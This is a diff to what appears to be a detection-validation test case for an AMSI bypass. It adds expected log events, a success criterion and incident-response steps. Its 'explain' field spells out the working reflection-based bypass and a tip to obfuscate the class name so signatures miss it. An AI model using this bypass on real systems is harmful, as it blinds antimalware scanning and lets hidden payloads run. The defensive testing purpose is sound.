@@ -168,6 +168,38 @@
         "edr",
         "sysmon"
       ]
+    },
+    "validation": {
+      "expected_events": [
+        {
+          "source": "powershell",
+          "description": "AMSI Bypass (PowerShell In-Memory) - Sentinel"
+        },
+        {
+          "source": "powershell",
+          "event_id": "4104",
+          "description": "PowerShell script block logging"
+        },
+        {
+          "source": "windows-security",
+          "event_id": "5001"
+        },
+        {
+          "source": "windows-security",
+          "event_id": "5007"
+        },
+        {
+          "source": "windows-security",
+          "description": "posh_ps_amsi_bypass (AMSI patch"
+        }
+      ],
+      "success_criteria": "At least one behavioral detection fires within 60 seconds of attack execution",
+      "response_steps": [
+        "Correlate alert with source host, user account, and timestamp",
+        "Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)",
+        "Verify whether the activity matches known administrative baselines or change windows",
+        "If confirmed malicious, isolate the host and escalate to incident response"
+      ]
     }
   },
   "explain": "Disables AMSI in the current PowerShell process so in-memory scripts run unscanned:\n  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')   reflect the internal AMSI class\n  .GetField('amsiInitFailed','NonPublic,Static')                    grab its private init-failed flag\n  .SetValue($null,$true)                                            set it true so AMSI thinks init failed and stops scanning\nAfter this, IEX/download-cradle payloads load without Defender inspecting them; obfuscate the string ('Am'+'si'+'Utils') because the literal is itself signatured."
